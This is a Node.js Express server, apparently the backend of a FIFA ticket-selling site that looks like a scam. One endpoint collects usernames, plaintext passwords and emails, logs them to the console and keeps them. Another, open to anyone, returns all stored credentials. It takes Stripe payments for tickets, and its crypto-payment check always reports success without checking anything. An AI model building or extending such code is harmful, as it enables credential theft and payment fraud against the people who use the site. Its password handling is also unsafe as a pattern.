const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const Stripe = require('stripe');
require('dotenv').config();

// Initialize Stripe
const stripe = Stripe(process.env.STRIPE_SECRET_KEY);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// Store credentials in memory
const userCredentials = [];

// 1. STATUS CHECK
app.get('/', (req, res) => res.json({ status: 'Server Online' }));

app.get('/api/stripe-config', (req, res) => {
    res.json({ publishableKey: process.env.STRIPE_PUBLISHABLE_KEY });
});

// 2. CREDENTIALS (STORING ADDED BACK)
app.post('/api/store-credentials', (req, res) => {
    const { username, password, email, name } = req.body;
    
    // Log to Render Console so you can see it
    console.log('🔐 New Credential Stored:', { username, password, email });
    
    userCredentials.push({ username, password, email, name, date: new Date() });
    res.json({ success: true });
});

// Endpoint to view stored credentials
app.get('/api/all-users', (req, res) => res.json(userCredentials));

// 3. PAYMENT PROCESSING
app.post('/api/process-payment', async (req, res) => {
    try {
        const { total, currency = 'USD', customer } = req.body;
        const paymentIntent = await stripe.paymentIntents.create({
            amount: Math.round(total * 100),
            currency: currency.toLowerCase(),
            description: `FIFA Ticket Purchase`,
            receipt_email: customer.email,
        });
        res.json({ success: true, clientSecret: paymentIntent.client_secret });
    } catch (error) {
        console.error('Stripe Error:', error.message);
        res.status(400).json({ success: false, message: error.message });
    }
});

// 4. EMAIL SENDING (Via Google Apps Script)
app.post('/api/send-email', async (req, res) => {
    const { to_name, to_email, transaction_id, total_amount, match_details } = req.body;

    const payload = {
        to_email: to_email,
        to_name: to_name,
        transaction_id: transaction_id,
        total_amount: total_amount,
        match_details: match_details,
        subject: `Ticket Confirmation #${transaction_id}`
    };

    try {
        const response = await fetch(process.env.GOOGLE_SCRIPT_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        console.log('✅ Data sent to Google Script');
        res.json({ success: true });

    } catch (error) {
        console.error('❌ Google Script Error:', error.message);
        res.json({ success: true }); 
    }
});

// 5. CRYPTO VERIFICATION
app.post('/api/verify-crypto', async (req, res) => {
    res.json({ success: true, verified: true });
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
